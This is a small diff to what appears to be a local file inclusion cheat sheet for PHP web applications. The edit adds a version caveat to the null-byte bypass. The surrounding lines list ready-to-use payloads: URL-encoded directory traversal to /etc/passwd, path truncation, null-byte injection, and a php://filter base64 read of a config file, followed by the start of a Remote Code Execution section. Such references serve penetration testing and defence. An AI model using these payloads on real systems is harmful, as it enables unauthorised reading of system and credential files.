@@ -8,7 +8,7 @@ Basic LFI
 LFI Bypasse
 1)	-   Bypass filters with URL encoding                              -     index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64           
 2)	-  Bypass appended extension with path truncation (obsolete)      -     /index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048]     
-3)     -   Bypass appended extension with null byte (obsolete)           -    /index.php?language=../../../../etc/passwd%00                                                 
+3)     -  Bypass appended extension with null byte (obsolete) not working with PHP 5.3.4 and above        -    /index.php?language=../../../../etc/passwd%00                                                 
 4)     -   Read PHP with base64 filter                                   -     /index.php?language=php://filter/read=convert.base64-encode/resource=config                    
 
 Remote Code Execution
